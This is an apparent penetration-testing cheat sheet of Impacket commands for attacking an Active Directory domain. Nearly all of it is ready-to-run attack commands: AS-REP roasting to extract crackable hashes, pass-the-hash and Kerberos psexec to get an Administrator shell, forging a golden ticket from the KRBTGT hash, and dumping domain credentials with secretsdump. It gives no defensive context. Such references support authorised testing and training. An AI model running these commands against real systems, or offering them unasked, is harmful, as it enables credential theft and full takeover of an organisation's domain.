# Impacket

## Enumeration

{% hint style="info" %}
**-format hashcat to export a formated hash**
{% endhint %}

### Account with doesn't require Kerberos Auth

```csharp
./GetNPUsers.py -dc-ip 10.110.0.222 -request 'crook.badcorp.local/' -format hashcat
```

## File server

```csharp
sudo ./smbserver.py Test /tmp -smb2support -user polo -password test123 
```

## Psexec

```csharp
./psexec.py -hashes <ntlm hash:ntlm hash> Administrator@<HOSTNAME>

# or without password (kerberos)

./psexec.py CROOK.BADCORP.LOCAL/Administrator@DC103 -k -no-pass
```

## Golden Ticket

### Request a TGT

```csharp
./ticketer.py -nthash <KRBTGT NTLM HASH> -domain-sid <DOMAIN SID> -domain <MYDOMAIN.LOCAL> Administrator
```

### Import the TGT

```csharp
export KRB5CCNAME=krb5cc_91801115_mine
```

### Connect using the ticket

```csharp
./psexec.py CROOK.BADCORP.LOCAL/Administrator@10.110.0.222 -k -no-pass
```

## DSYNC

```csharp
./secretsdump.py crook.badcorp.local/User:Password@10.110.0.222
```

